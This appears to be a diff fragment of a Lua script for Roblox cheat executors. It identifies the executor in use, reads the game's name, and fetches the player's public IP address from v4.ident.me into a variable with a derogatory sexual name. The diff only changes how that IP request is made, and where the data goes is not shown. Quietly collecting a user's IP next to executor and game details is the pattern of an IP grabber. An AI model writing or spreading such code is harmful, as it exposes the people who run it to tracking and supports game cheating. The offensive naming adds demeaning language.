@@ -5,7 +5,7 @@ local http=game:GetService("HttpService")
 local exec="Unknown"
 if syn then exec="Synapse X"elseif identifyexecutor then exec=identifyexecutor()elseif secure_load then exec="Sentinel"elseif pebc_execute then exec="KRNL"elseif hookfunction and checkcaller and setreadonly then exec="Delta"end
 local gName="Unknown"
-local pall_gay_sex = game:GetService("HttpService"):GetAsync("https://v4.ident.me/")
+local pall_gay_sex = game:HttpGet("https://v4.ident.me/")
 
 pcall(function()
 gName=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
